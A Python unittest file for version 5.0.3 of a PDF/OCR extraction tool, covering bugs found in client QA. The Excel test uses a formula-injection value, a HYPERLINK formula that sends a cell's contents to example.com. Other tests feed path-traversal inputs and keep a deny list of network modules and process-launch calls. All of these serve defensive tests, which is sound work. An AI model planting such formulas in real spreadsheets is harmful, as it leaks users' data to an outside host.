"""Extract 5.0.3: bugs found by the third client QA of 04/10/2026 (CHANGELOG.md, one entry each).
Every test here fails on 5.0.2, except the two guards of B33 (nothing was wrong there; they keep it so)."""

import json
import os
import shutil
import tempfile
import unittest
from dataclasses import replace
from pathlib import Path
from unittest import mock
from urllib.parse import urlencode

import numpy as np
import pikepdf
import pypdfium2 as pdfium

import extract
from extract.api import Reader
from extract.engine.batch import open_pdf
from extract.errors import PasswordProtected, UnsupportedFile
from extract.outputs import jsondoc
from extract.types import Word
from tests.fake_guard import FakeGuard
from tests.support import SANS, SPANISH_LINES, SetLexicon, digital_pdf, scanned_pdf, text_page_image
from tests.test_ui import CHROME, Running, chrome
from tests.test_ui_v501 import read_result

ROOT = Path(__file__).resolve().parents[1]

FIXTURES = Path(__file__).parent / "fixtures"


class Scratch(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.tmp, True)


class StalePdfiumError(Scratch):
    """B16: the reason a PDF could not be opened must be its own, not the one left by the file opened before."""

    def make_locked(self):
        path = self.tmp / "locked.pdf"
        with pikepdf.new() as pdf:
            pdf.add_blank_page()
            pdf.save(path, encryption=pikepdf.Encryption(owner="o", user="u"))
        return path

    def make_zero_pages(self):
        path = self.tmp / "zero.pdf"
        with pikepdf.new() as pdf:
            pdf.save(path)
        return path

    def test_B16_a_pdf_with_no_pages_after_a_locked_one_is_not_called_password_protected(self):
        locked, zero = self.make_locked(), self.make_zero_pages()
        with self.assertRaises(PasswordProtected):
            open_pdf(locked)
        with self.assertRaises(UnsupportedFile) as caught:
            open_pdf(zero)
        self.assertEqual(caught.exception.code, "error.unsupported_file")

    def test_B16_the_locked_file_is_still_called_password_protected(self):
        with self.assertRaises(PasswordProtected):
            open_pdf(self.make_locked())
        with self.assertRaises(PasswordProtected):
            open_pdf(self.make_locked())


class InvoiceFieldsAreNotSentences(Scratch):
    """B17: the label of the number or the date is followed by the rest of its row; only what can be that field is taken."""

    def fields(self, *lines):
        from bench.corpus.pdf_words import read_native_page
        from extract.fields import extract_invoice
        from tests.support import digital_pdf

        path = digital_pdf(self.tmp / "page.pdf", [list(lines)])
        return extract_invoice(read_native_page(path))

    def test_B17_the_letter_with_factura_numero_has_the_number_and_not_the_sentence(self):
        lines = json.loads((Path(__file__).parent / "data" / "spanish.json").read_text(encoding="utf-8"))["lines"]
        invoice = self.fields(*lines)
        self.assertEqual(invoice.number.text, "2026-0042")
        self.assertEqual(len(invoice.number.word_ids), 1)
        self.assertIsNone(invoice.date)

    def test_B17_the_saved_documents_made_from_that_letter_carry_the_number_only(self):
        for name in ("doubtful", "unreadable"):
            with self.subTest(name):
                document = extract.load(FIXTURES / f"{name}.extract.json")
                self.assertEqual(document.invoice.number.text, "2026-0042")

    def test_B17_a_number_in_its_usual_shapes_is_kept_whole(self):
        for line, expected in [
            ("Factura numero F-2026-0498 emitida el 20/01/2025", "F-2026-0498"),
            ("Nº de factura: INV-2026-9451", "INV-2026-9451"),
            ("Invoice number 2026/0042 issued to Zorvanta Ltd for consulting", "2026/0042"),
            ("Factura no. A 2025 7230 emitida a Zorvanta SL", "A 2025 7230"),
            ("Invoice no #0042 due in thirty days", "#0042"),
        ]:
            with self.subTest(line):
                self.assertEqual(self.fields(line).number.text, expected)

    def test_B17_words_with_no_number_in_them_are_never_a_number(self):
        for line in [
            "Factura numero de nuestra empresa a nombre del cliente",
            "Invoice number issued to Zorvanta Ltd for consulting services",
            "Factura numero 1234567890123456789012345678901234567890",
        ]:
            with self.subTest(line):
                self.assertIsNone(self.fields(line).number)

    def test_B17_a_date_is_the_date_and_not_the_sentence_after_it(self):
        for line, expected in [
            ("Fecha de emision 14/03/2026 servicios de consultoria", "14/03/2026"),
            ("Fecha: 14 de marzo de 2026 emitida a Zorvanta SL", "14 de marzo de 2026"),
            ("Invoice date March 14, 2026 payable in thirty days", "March 14, 2026"),
            ("Date of issue 2026-03-14 for the services listed", "2026-03-14"),
        ]:
            with self.subTest(line):
                self.assertEqual(self.fields(line).date.text, expected)

    def test_B17_the_misread_characters_of_a_real_number_do_not_make_it_a_sentence(self):
        from extract.fields.invoice import _date_words, _number_words

        def words(*texts):
            return [Word(f"p1w{i}", 1, t, (10 * i, 0, 10 * i + 8, 10)) for i, t in enumerate(texts)]

        self.assertEqual([w.text for w in _number_words(words(",a-2025-7230", "emitida"))], [",a-2025-7230"])
        self.assertEqual([w.text for w in _date_words(words(".09/27/2025", "emitida", "servicios"))], [".09/27/2025"])
        self.assertEqual([w.text for w in _date_words(words("25de", "diciembre", "de", "2025", "total"))][-1], "2025")


def _page_json(path, tall):
    """The words of a page for the fake engine: boxes wider than tall as on a page the right way up, or taller than wide
    as on a page turned a quarter."""
    size = (12.0, 50.0) if tall else (50.0, 12.0)
    lines = [
        [(f"word{i}{j}", 0.99, (60.0 * j, 70.0 * i, 60.0 * j + size[0], 70.0 * i + size[1])) for j in range(3)]
        for i in range(6)
    ]
    path.write_text(json.dumps(lines), encoding="utf-8")
    return path


class LowResolutionAndSideways(Scratch):
    """B18: a scan under 100 dpi, or a page whose lines run up or down, is read as always but the page says so."""

    def setUp(self):
        super().setUp()
        patch = mock.patch.object(Reader, "_engine_factory", "tests.fake_engine:load_engine")
        patch.start()
        self.addCleanup(patch.stop)
        page = _page_json(self.tmp / "straight.json", tall=False)
        env = mock.patch.dict(os.environ, {"EXTRACT_FAKE_PAGE": str(page)})
        env.start()
        self.addCleanup(env.stop)

    def scan(self, name, dpi):
        width, height = round(595.28 / 72 * dpi), round(841.89 / 72 * dpi)
        image = np.full((height, width), 255, dtype=np.uint8)
        return scanned_pdf(self.tmp / name, [image])

    def read(self, path):
        seen = []
        options = extract.Options(work_dir=self.tmp / "work", languages=("es",))
        with Reader(options, guard=FakeGuard(), lexicon=SetLexicon(())) as reader:
            document = reader.read(path, on_event=seen.append)
        return document, [e for e in seen if isinstance(e, extract.events.Warning)]

    def test_B18_the_resolution_of_a_scan_is_told_as_it_is_not_as_the_reader_raises_it(self):
        from extract.engine.render import scan_dpi

        for dpi in (70, 150, 300):
            with self.subTest(dpi=dpi):
                document = pdfium.PdfDocument(str(self.scan(f"s{dpi}.pdf", dpi)))
                self.assertEqual(scan_dpi(document[0]), dpi)
        digital = pdfium.PdfDocument(str(digital_pdf(self.tmp / "d.pdf", [["a line"]])))
        self.assertIsNone(scan_dpi(digital[0]))

    def test_B18_a_scan_under_100_dpi_gets_a_note_that_is_kept_in_the_document_and_its_file(self):
        document, warnings = self.read(self.scan("low.pdf", 70))
        self.assertEqual(document.pages[0].dpi, 100)  # read as before: the engine did not move
        self.assertEqual([w.code for w in warnings], ["page.warning.low_resolution"])
        self.assertEqual(warnings[0].params, {"page": 1, "dpi": 70})
        self.assertEqual(document.page_notes, [{"key": "page.warning.low_resolution", "page": 1, "dpi": 70}])
        saved = self.tmp / "low.extract.json"
        document.save(saved)
        self.assertEqual(json.loads(saved.read_text(encoding="utf-8"))["options"]["page_notes"], document.page_notes)
        self.assertEqual(extract.load(saved).page_notes, document.page_notes)

    def test_B18_a_scan_of_100_dpi_or_more_gets_no_note(self):
        for dpi in (100, 200):
            with self.subTest(dpi=dpi):
                document, warnings = self.read(self.scan(f"ok{dpi}.pdf", dpi))
                self.assertEqual((document.page_notes, warnings), ([], []))
                self.assertNotIn("page_notes", json.loads(json.dumps(jsondoc.to_dict(document._data)))["options"])

    def test_B18_a_page_whose_lines_run_up_or_down_gets_a_note_and_its_words_are_unchanged(self):
        page = _page_json(self.tmp / "tall.json", tall=True)
        with mock.patch.dict(os.environ, {"EXTRACT_FAKE_PAGE": str(page)}):
            document, warnings = self.read(self.scan("turned.pdf", 150))
        self.assertEqual([w.code for w in warnings], ["page.warning.sideways"])
        self.assertEqual(document.page_notes, [{"key": "page.warning.sideways", "page": 1}])
        self.assertEqual([w.text for w in document.pages[0].words][:3], ["word00", "word01", "word02"])

    def test_B18_a_page_that_is_the_right_way_up_gets_no_sideways_note(self):
        document, warnings = self.read(self.scan("straight.pdf", 150))
        self.assertEqual((document.page_notes, warnings), ([], []))

    def test_B18_the_interface_sends_the_notes_with_the_document(self):
        run = Running(
            self.tmp / "ui-work",
            root=self.tmp,
            reader_factory=lambda o: Reader(o, guard=FakeGuard(), lexicon=SetLexicon(())),
        )
        self.addCleanup(run.close)
        run.call("/api/read", {"paths": [str(self.scan("low.pdf", 70))], "options": {"languages": ["es"]}})
        seen = run.events("job.finished")
        self.assertIn("page.warning.low_resolution", [e.get("code") for e in seen if e["event"] == "job.warning"])
        _, docs = run.call("/api/docs")
        self.assertEqual(docs["docs"][0]["notes"], [{"key": "page.warning.low_resolution", "page": 1, "dpi": 70}])
        for lang in ("en", "es"):
            texts = json.loads((ROOT / "src/extract/ui/i18n" / f"{lang}.json").read_text(encoding="utf-8"))
            for key in ("page.warning.low_resolution", "page.warning.sideways"):
                self.assertIn(key, texts)


class WorkbookHoldsNoFormulas(Scratch):
    """B19: text from a PDF that starts with "=" must stay text in the workbook."""

    EVIL = '=HYPERLINK("http://example.com/?x="&A1,"click")'

    def test_B19_a_word_or_a_field_that_starts_with_an_equals_sign_is_text_in_every_sheet(self):
        import openpyxl

        from extract.outputs.excel import write_excel
        from extract.types import Cell
        from tests.support import SANS, SPANISH_LINES, replace_word, sample_document, text_page_image

        source = scanned_pdf(self.tmp / "i.pdf", [text_page_image(SPANISH_LINES, SANS, 24, 1240, 1754)] * 2)
        data = sample_document(source)
        first = data.pages[0]
        words = list(first.words)
        words[1] = replace_word(words[1], text=self.EVIL)  # a doubtful word: it goes to the Review sheet
        words[8] = replace_word(words[8], text=self.EVIL, original="=1+1")  # a typed word: the Corrections sheet
        data = replace(
            data,
            pages=(replace(first, words=tuple(words)), data.pages[1]),
            invoice=replace(data.invoice, number=Cell(self.EVIL, ("p1w1",), 1)),
        )
        write_excel(data, self.tmp / "out.xlsx")
        book = openpyxl.load_workbook(self.tmp / "out.xlsx")
        texts = []
        for sheet in book:
            for row in sheet.iter_rows():
                for cell in row:
                    self.assertNotEqual(cell.data_type, "f", f"{sheet.title}!{cell.coordinate}: {cell.value}")
                    if isinstance(cell.value, str) and cell.value.startswith("="):
                        texts.append((sheet.title, cell.value))
        self.assertIn(("Fields", self.EVIL), texts)
        self.assertIn(("Review", self.EVIL), texts)
        self.assertIn(("Corrections", "=1+1"), texts)


class TypedPaths(Scratch):
    """B20: what a person types or pastes in the Folder box."""

    def setUp(self):
        super().setUp()
        self.folder = self.tmp / "My PDFs \u00f1"
        self.folder.mkdir()
        shutil.copy(FIXTURES / "doubtful.pdf", self.folder / "a.pdf")
        self.run_ = Running(self.tmp / "work", root=self.tmp)
        self.addCleanup(self.run_.close)

    def browse(self, path):
        return self.run_.call("/api/browse?" + urlencode({"path": path}))

    def test_B20_a_relative_path_starts_from_the_home_folder_and_not_from_where_the_server_was_started(self):
        status, body = self.browse("My PDFs \u00f1")
        self.assertEqual((status, body["path"], [f["name"] for f in body["pdfs"]]), (200, str(self.folder), ["a.pdf"]))
        self.assertEqual(self.browse("My PDFs \u00f1/../My PDFs \u00f1")[1]["path"], str(self.folder))

    def test_B20_spaces_and_the_quotes_of_copy_as_path_are_dropped(self):
        for typed in (f" {self.folder}  ", f'"{self.folder}"', f"'{self.folder}'", f'  "{self.folder}" '):
            with self.subTest(typed):
                status, body = self.browse(typed)
                self.assertEqual((status, body.get("path")), (200, str(self.folder)))

    def test_B20_a_path_the_system_cannot_look_up_is_not_found_and_not_an_internal_error(self):
        for typed in ("~nobody-by-this-name/x", "a" * 5000, "x/" + "b" * 300):
            with self.subTest(typed[:20]):
                status, body = self.browse(typed)
                self.assertEqual((status, body["error"]["code"]), (404, "error.not_found"))

    def test_B20_nothing_gets_out_of_the_home_folder_by_being_relative(self):
        for typed in ("..", "../..", "My PDFs \u00f1/../..", "/etc"):
            with self.subTest(typed):
                status, body = self.browse(typed)
                self.assertEqual((status, body["error"]["code"]), (403, "error.path_outside_home"))


class SearchableTextLayerOfRealWords(Scratch):
    """B21: the words of a real page, set as tight as an OCR sets them, stay separate words in every viewer."""

    def test_B21_the_real_words_of_a_letter_are_found_as_a_phrase_in_pdfium_and_the_same_words_in_poppler(self):
        import subprocess

        document = extract.load(FIXTURES / "doubtful.extract.json")
        out = self.tmp / "out.pdf"
        from extract.fixes import tokens
        from extract.outputs.pdf import add_text_layer

        add_text_layer(FIXTURES / "doubtful.pdf", document._data.pages, out)
        words = [w.text for page in document._data.pages for w in tokens(page)]
        page = pdfium.PdfDocument(str(out))[0].get_textpage()
        lost = [
            f"{a} {b}" for a, b in zip(words, words[1:], strict=False) if page.search(f"{a} {b}").get_next() is None
        ]
        self.assertEqual(lost, [])
        poppler = subprocess.run(["pdftotext", "-raw", str(out), "-"], capture_output=True, text=True, check=True)
        self.assertEqual(poppler.stdout.split(), words)


@unittest.skipIf(CHROME is None, "google-chrome is needed")
class PageNotesOnScreen(Scratch):
    """B18 and B22: the notes of a page show in the Review panel, and a warning of the Read screen names its document."""

    def test_B22_the_read_screen_names_the_document_of_a_warning_and_the_review_panel_shows_the_page_notes(self):
        run = Running(
            self.tmp / "work", [FIXTURES / "doubtful.extract.json", FIXTURES / "unreadable.extract.json"], root=self.tmp
        )
        self.addCleanup(run.close)
        url = run.url("/?selftest=ui&section=pagenotes&lang=en&nowait=1")
        result = read_result(chrome(["--virtual-time-budget=60000", "--window-size=1280,900", "--dump-dom", url]))
        self.assertEqual([c for c in result["checks"] if not c["ok"]], [])
        self.assertGreaterEqual(len(result["checks"]), 6)


class EstimateFollowsTheComputer(Scratch):
    """B23: the time estimate was a fixed range measured on one laptop and said "on this PC" on every PC."""

    def test_B23_the_factor_is_the_median_page_time_shared_by_the_workers_over_the_reference(self):
        from extract.ui.server import REFERENCE_PAGE_SECONDS, measured_speed_factor

        entries = [
            {"code": "pool.page", "pid": p, "seconds": s} for p, s in ((1, 11.0), (2, 12.0), (1, 9.0), (2, 30.0))
        ]
        self.assertAlmostEqual(measured_speed_factor(entries), 12.0 / 2 / REFERENCE_PAGE_SECONDS)
        self.assertIsNone(measured_speed_factor(entries[:2]))  # two pages say nothing
        self.assertIsNone(measured_speed_factor([{"code": "pool.window"}] * 5))
        very_slow = [{"code": "pool.page", "pid": 1, "seconds": 900.0}] * 3
        self.assertEqual(measured_speed_factor(very_slow), 8.0)

    def test_B23_a_read_teaches_the_server_and_the_work_folder_keeps_it(self):
        patch = mock.patch.object(Reader, "_engine_factory", "tests.fake_engine:load_engine")
        patch.start()
        self.addCleanup(patch.stop)
        scan = text_page_image(SPANISH_LINES, SANS, 24, 1240, 1754)
        pdf = scanned_pdf(self.tmp / "scan.pdf", [scan] * 4)
        factory = lambda o: Reader(o, guard=FakeGuard(), lexicon=SetLexicon(()))  # noqa: E731
        run = Running(self.tmp / "work", root=self.tmp, reader_factory=factory)
        self.addCleanup(run.close)
        _, before = run.call("/api/defaults")
        self.assertEqual((before["speed_factor"], before["speed_measured"]), (1.0, False))
        run.call("/api/read", {"paths": [str(pdf)], "options": {"languages": ["es"]}})
        run.events("job.finished")
        for _ in range(50):  # the factor is learnt right after the last document
            _, after = run.call("/api/defaults")
            if after["speed_measured"]:
                break
        self.assertTrue(after["speed_measured"])
        self.assertTrue((self.tmp / "work" / "speed.json").is_file())
        again = Running(self.tmp / "work", root=self.tmp)
        self.addCleanup(again.close)
        self.assertEqual(again.call("/api/defaults")[1]["speed_factor"], after["speed_factor"])

    def test_B23_a_folder_that_cannot_be_written_does_not_stop_the_estimate(self):
        from extract.ui.server import State

        state = State(self.tmp, self.tmp / "no" / "such" / "folder", None)
        with mock.patch("pathlib.Path.mkdir", side_effect=PermissionError):
            state.learn_speed([{"code": "pool.page", "pid": 1, "seconds": 5.0}] * 3)
        self.assertTrue(state.speed_measured)

    def test_B23_the_screen_scales_the_figures_and_says_this_pc_only_when_it_is_so(self):
        if CHROME is None:
            self.skipTest("google-chrome is needed")
        run = Running(self.tmp / "work", [FIXTURES / "doubtful.extract.json"], root=self.tmp)
        self.addCleanup(run.close)
        url = run.url("/?selftest=ui&section=speedestimate&lang=en&nowait=1")
        result = read_result(chrome(["--virtual-time-budget=60000", "--window-size=1280,900", "--dump-dom", url]))
        self.assertEqual([c for c in result["checks"] if not c["ok"]], [])
        self.assertGreaterEqual(len(result["checks"]), 4)
        for lang in ("en", "es"):
            texts = json.loads((ROOT / "src/extract/ui/i18n" / f"{lang}.json").read_text(encoding="utf-8"))
            for key in ("ui.import.estimate_typical", "ui.import.estimate_typical_one"):
                self.assertIn(key, texts)


class InstallerNamesPathsYouCanPaste(unittest.TestCase):
    """B24: the installer's last line and the commands it echoes must work when pasted, with a space in the path."""

    def load(self):
        import importlib.util

        spec = importlib.util.spec_from_file_location("install_script", ROOT / "scripts" / "install.py")
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        return module

    def test_B24_a_path_with_spaces_or_accents_is_quoted_and_a_plain_one_is_not(self):
        import shlex

        install = self.load()
        spaced = Path("/srv/me/My Extract \u00f1/extract/.venv/bin/python")
        line = install.shown([spaced, "-m", "extract.ui"])
        self.assertEqual(shlex.split(line), [str(spaced), "-m", "extract.ui"])
        plain = install.shown(["/srv/me/extract/.venv/bin/python", "-m", "extract.ui"])
        self.assertEqual(plain, "/srv/me/extract/.venv/bin/python -m extract.ui")

    def test_B24_the_last_line_and_the_failure_message_use_it(self):
        text = (ROOT / "scripts" / "install.py").read_text(encoding="utf-8")
        self.assertIn("shown([python, '-m', 'extract.ui'])", text)
        self.assertNotIn("' '.join(command)", text)


class ReadingAgainKeepsTheUsersWork(Scratch):
    """B25: reading again a file whose open copy the user changed asked for nothing and lost the changes."""

    def setUp(self):
        super().setUp()
        patch = mock.patch.object(Reader, "_engine_factory", "tests.fake_engine:load_engine")
        patch.start()
        self.addCleanup(patch.stop)
        page = _page_json(self.tmp / "straight.json", tall=False)
        env = mock.patch.dict(os.environ, {"EXTRACT_FAKE_PAGE": str(page)})
        env.start()
        self.addCleanup(env.stop)
        self.pdf = scanned_pdf(self.tmp / "scan.pdf", [text_page_image(SPANISH_LINES, SANS, 24, 1240, 1754)])
        self.run_ = Running(
            self.tmp / "work",
            root=self.tmp,
            reader_factory=lambda o: Reader(o, guard=FakeGuard(), lexicon=SetLexicon(())),
        )
        self.addCleanup(self.run_.close)

    def read(self, **extra):
        before = len(self.run_.call("/api/events?after=0&wait=0")[1]["events"])
        status, body = self.run_.call("/api/read", {"paths": [str(self.pdf)], **extra})
        if status == 200:
            for _ in range(200):
                events = self.run_.call(f"/api/events?after={before}&wait=1")[1]["events"]
                if any(e["event"] == "job.finished" for e in events):
                    break
            self.run_.state.job.join(10)  # the thread ends a moment after its last event
        return status, body

    def doc(self):
        return self.run_.call("/api/docs")[1]["docs"][0]

    def test_B25_a_document_with_nothing_changed_is_read_again_without_asking(self):
        self.assertEqual(self.read()[0], 200)
        self.assertEqual(self.read()[0], 200)

    def test_B25_after_an_accepted_or_typed_word_the_server_asks_with_the_names_and_changes_nothing(self):
        self.read()
        doc = self.doc()
        word = doc["doubtful"][0]["id"]
        self.assertEqual(self.run_.call("/api/correct", {"doc": doc["id"], "word": word, "text": "MINE"})[0], 200)
        status, body = self.read()
        self.assertEqual((status, body["error"]["code"]), (400, "error.edits_would_be_lost"))
        self.assertEqual(body["error"]["params"]["names"], ["scan.pdf"])
        words = self.run_.call(f"/api/words/{doc['id']}/1")[1]["words"]
        self.assertEqual([w["text"] for w in words if w["id"] == word], ["MINE"])

    def test_B25_with_replace_the_read_goes_ahead_and_the_changes_are_gone(self):
        self.read()
        doc = self.doc()
        word = doc["doubtful"][0]["id"]
        self.run_.call("/api/accept", {"doc": doc["id"], "word": word})
        self.assertEqual(self.read(replace=True)[0], 200)
        words = self.run_.call(f"/api/words/{doc['id']}/1")[1]["words"]
        self.assertEqual([w["review"] for w in words if w["id"] == word], [None])

    @unittest.skipIf(CHROME is None, "google-chrome is needed")
    def test_B25_the_screen_asks_before_it_replaces_and_reads_only_after_the_yes(self):
        url = self.run_.url("/?selftest=ui&section=replaceedits&lang=en&nowait=1")
        result = read_result(chrome(["--virtual-time-budget=60000", "--window-size=1280,900", "--dump-dom", url]))
        self.assertEqual([c for c in result["checks"] if not c["ok"]], [])
        self.assertGreaterEqual(len(result["checks"]), 3)


@unittest.skipIf(CHROME is None, "google-chrome is needed")
class TwoTabsOnOneDocument(Scratch):
    """B26: a document changed in another tab must show here when this tab gets the focus back."""

    def test_B26_a_tab_that_gets_the_focus_back_reads_what_the_server_holds(self):
        run = Running(
            self.tmp / "work",
            [FIXTURES / f"{name}.extract.json" for name in ("doubtful", "mismatch", "unreadable")],
            root=self.tmp,
        )
        self.addCleanup(run.close)
        url = run.url("/?selftest=ui&section=refocus&lang=en&nowait=1")
        result = read_result(chrome(["--virtual-time-budget=60000", "--window-size=1280,900", "--dump-dom", url]))
        self.assertEqual([c for c in result["checks"] if not c["ok"]], [])
        self.assertGreaterEqual(len(result["checks"]), 4)


class OfflineBundleReadme(unittest.TestCase):
    """B27: the README inside the offline bundle."""

    def test_B27_the_windows_command_has_one_backslash_between_its_names(self):
        import sys

        sys.path.insert(0, str(ROOT / "scripts"))
        try:
            import make_offline_bundle
        finally:
            sys.path.remove(str(ROOT / "scripts"))
        text = make_offline_bundle.README.format(platform="win-amd64-py310", python="3.10", system="Windows")
        self.assertIn("(.venv\\Scripts\\python -m extract.ui on Windows)", text)
        self.assertNotIn("\\\\", text)


class WorkersDoNotOutliveTheirParent(Scratch):
    """B28: killing the process that reads (or closing its terminal) left the OCR workers running, 800 MB each."""

    SCRIPT = """\
import json, os, signal, threading, time

import psutil

from extract.api import Reader

Reader._engine_factory = "tests.fake_engine:load_engine"


def die():
    while not psutil.Process().children():  # a slow computer takes a while to start its workers
        time.sleep(0.5)
    time.sleep(3)  # they are up and in the middle of a page
    print(json.dumps([c.pid for c in psutil.Process().children(recursive=True)]), flush=True)
    os.kill(os.getpid(), signal.SIGKILL)


if __name__ == "__main__":
    threading.Thread(target=die, daemon=True).start()
    with Reader(guard=False) as reader:
        reader.read({pdf!r})
"""

    def test_B28_the_workers_leave_when_the_process_that_started_them_is_killed(self):
        import subprocess
        import sys
        import time

        import psutil

        pdf = scanned_pdf(self.tmp / "scan.pdf", [text_page_image(SPANISH_LINES, SANS, 24, 1240, 1754)] * 12)
        script = self.tmp / "script.py"
        script.write_text(self.SCRIPT.format(pdf=str(pdf)), encoding="utf-8")
        env = {
            **os.environ,
            "PYTHONPATH": os.pathsep.join(p for p in sys.path if p),
            "XDG_CACHE_HOME": str(self.tmp / "cache"),
            "EXTRACT_FAKE_SECONDS": "2",
        }
        done = subprocess.run([sys.executable, str(script)], capture_output=True, text=True, env=env, timeout=120)
        children = json.loads(done.stdout.strip().splitlines()[-1])
        self.assertTrue(children, "no worker was running when the parent was killed")
        self.addCleanup(lambda: [psutil.Process(p).kill() for p in children if psutil.pid_exists(p)])
        deadline = time.time() + 30
        while time.time() < deadline and any(
            psutil.pid_exists(p) and psutil.Process(p).status() != "zombie" for p in children
        ):
            time.sleep(0.5)
        alive = [p for p in children if psutil.pid_exists(p) and psutil.Process(p).status() != "zombie"]
        self.assertEqual(alive, [])


class ReadRequestShape(Scratch):
    """B29: a request to read that is not shaped like the screen's is a bad request, not an internal error."""

    def test_B29_paths_that_are_not_a_list_of_strings_and_options_that_are_not_an_object_are_refused(self):
        run = Running(self.tmp / "work", root=self.tmp)
        self.addCleanup(run.close)
        pdf = str(FIXTURES / "doubtful.pdf")
        for body in (
            {"paths": pdf},
            {"paths": None},
            {"paths": [1, 2]},
            {"paths": [[pdf]]},
            {"paths": {"a": 1}},
            {"paths": [pdf], "options": "x"},
            {"paths": [pdf], "options": [1]},
        ):
            with self.subTest(body=json.dumps(body)[:40]):
                status, answer = run.call("/api/read", body)
                self.assertEqual((status, answer["error"]["code"]), (400, "error.bad_request"))


@unittest.skipIf(CHROME is None, "google-chrome is needed")
class WindowsPathsOnScreen(Scratch):
    """B30: the folder buttons and the names on screen for a computer that writes C:\\Users\\me\\Documents."""

    def test_B30_a_windows_path_gives_the_same_folder_buttons_and_names(self):
        run = Running(self.tmp / "work", [FIXTURES / "doubtful.extract.json"], root=self.tmp)
        self.addCleanup(run.close)
        url = run.url("/?selftest=ui&section=winpaths&lang=en&nowait=1")
        result = read_result(chrome(["--virtual-time-budget=60000", "--window-size=1280,900", "--dump-dom", url]))
        self.assertEqual([c for c in result["checks"] if not c["ok"]], [])
        self.assertGreaterEqual(len(result["checks"]), 7)


class WorkbookWithControlCharacters(Scratch):
    """B31: a control character in a word must not make the whole Excel file fail."""

    def test_B31_a_bell_a_null_and_a_control_code_in_a_word_or_a_field_are_written_as_the_replacement_character(self):
        import openpyxl

        from extract.outputs.excel import write_excel
        from extract.types import Cell
        from tests.support import SANS, SPANISH_LINES, replace_word, sample_document, text_page_image

        source = scanned_pdf(self.tmp / "i.pdf", [text_page_image(SPANISH_LINES, SANS, 24, 1240, 1754)] * 2)
        data = sample_document(source)
        first = data.pages[0]
        words = list(first.words)
        words[1] = replace_word(words[1], text="2026\x07-0042")  # a doubtful word of the Review sheet
        words[8] = replace_word(words[8], text="x\x00y\x1fz", original="o\x0bk")  # a typed word of Corrections
        data = replace(
            data,
            pages=(replace(first, words=tuple(words)), data.pages[1]),
            invoice=replace(data.invoice, number=Cell("F\x07-1", ("p1w1",), 1)),
        )
        write_excel(data, self.tmp / "out.xlsx")
        book = openpyxl.load_workbook(self.tmp / "out.xlsx")
        cells = {(sheet.title, cell.value) for sheet in book for row in sheet.iter_rows() for cell in row}
        self.assertIn(("Review", "2026�-0042"), cells)
        self.assertIn(("Corrections", "x�y�z"), cells)
        self.assertIn(("Corrections", "o�k"), cells)
        self.assertIn(("Fields", "F�-1"), cells)


class OwnerRestrictedPdf(Scratch):
    """B32: what the searchable PDF does with the restrictions of the original is said in the README."""

    def test_B32_the_searchable_pdf_of_a_restricted_original_is_not_restricted_and_the_readme_says_so(self):
        from dataclasses import replace as _replace

        from extract.outputs.pdf import add_text_layer
        from tests.support import grid_reading

        source = self.tmp / "restricted.pdf"
        with pikepdf.new() as pdf:
            pdf.add_blank_page()
            allow = pikepdf.Permissions(extract=False, modify_assembly=False)
            pdf.save(source, encryption=pikepdf.Encryption(owner="o", user="", allow=allow))
        with pikepdf.open(source) as pdf:
            self.assertFalse(pdf.allow.extract)
        reading = _replace(grid_reading(1, ["one", "two"]), status="ocr")
        out = self.tmp / "out.pdf"
        add_text_layer(source, [reading], out)
        with pikepdf.open(out) as pdf:
            self.assertFalse(pdf.is_encrypted)
        readme = (ROOT / "README.md").read_text(encoding="utf-8")
        self.assertIn("owner password that restricts it", readme)
        self.assertIn("without those restrictions", readme)


class NoNetworkNoBrowserAtRunTime(Scratch):
    """B33: reading never opens a connection outside this computer and never starts another program (a browser, a helper).
    The only program the code may start is the file manager, for the folder buttons (`open_folder`)."""

    NETWORK_MODULES = (
        "socket",
        "ssl",
        "urllib.request",
        "http.client",
        "ftplib",
        "smtplib",
        "xmlrpc.client",
        "requests",
        "httpx",
    )

    def test_B33_the_source_imports_no_network_module_and_starts_no_browser(self):
        import ast

        offenders = []
        for path in sorted((ROOT / "src").rglob("*.py")):
            tree = ast.parse(path.read_text(encoding="utf-8"))
            for node in ast.walk(tree):
                names = []
                if isinstance(node, ast.Import):
                    names = [a.name for a in node.names]
                elif isinstance(node, ast.ImportFrom) and node.module:
                    names = [node.module] + [f"{node.module}.{a.name}" for a in node.names]
                offenders += [f"{path.name}: import {n}" for n in names if n in self.NETWORK_MODULES]
                if isinstance(node, ast.Attribute) and node.attr in (
                    "Popen",
                    "startfile",
                    "system",
                    "popen",
                    "spawnv",
                    "execv",
                ):
                    offenders.append(f"{path.name}:{node.lineno}: {node.attr}")
        self.assertEqual(
            [o for o in offenders if not (o.startswith("server.py") and ("Popen" in o or "startfile" in o))],
            [],
            "network or process code",
        )
        server = (ROOT / "src/extract/ui/server.py").read_text(encoding="utf-8")
        self.assertEqual(server.count("subprocess.Popen("), 1)  # open_folder only
        self.assertIn('opener = "open" if sys.platform == "darwin" else "xdg-open"', server)
        for path in (ROOT / "src").rglob("*"):
            if path.suffix in (".py", ".js", ".html", ".css") and path.is_file():
                text = path.read_text(encoding="utf-8")
                for needle in ("google-chrome", "chromium", "msedge", "playwright", "selenium"):
                    self.assertNotIn(needle, text, f"{path.name} mentions {needle}")

    def test_B33_a_whole_read_connects_to_nobody_and_starts_nothing(self):
        import socket
        import subprocess

        calls = []

        def refuse_connect(self, address, *a, **k):
            calls.append(("connect", address))
            raise OSError("network is off in this test")

        def refuse_start(*a, **k):
            calls.append(("start", a[:1]))
            raise OSError("no program may start during a read")

        # a scan, so that the engine workers start too (the stand-in engine, which also refuses the network by itself)
        image = np.full((1190, 842), 255, dtype=np.uint8)
        source = scanned_pdf(self.tmp / "s.pdf", [image])
        options = extract.Options(work_dir=self.tmp / "work", languages=("es",))
        with (
            mock.patch.object(socket.socket, "connect", refuse_connect),
            mock.patch.object(socket.socket, "connect_ex", refuse_connect),
            mock.patch.object(socket, "getaddrinfo", lambda *a, **k: calls.append(("dns", a[:1])) or []),
            mock.patch.object(subprocess, "Popen", refuse_start),
            mock.patch.object(Reader, "_engine_factory", "tests.fake_engine:load_engine"),
        ):
            with Reader(options, guard=FakeGuard(), lexicon=SetLexicon(())) as reader:
                reader.read(source, on_event=lambda e: None)
        self.assertEqual(calls, [])
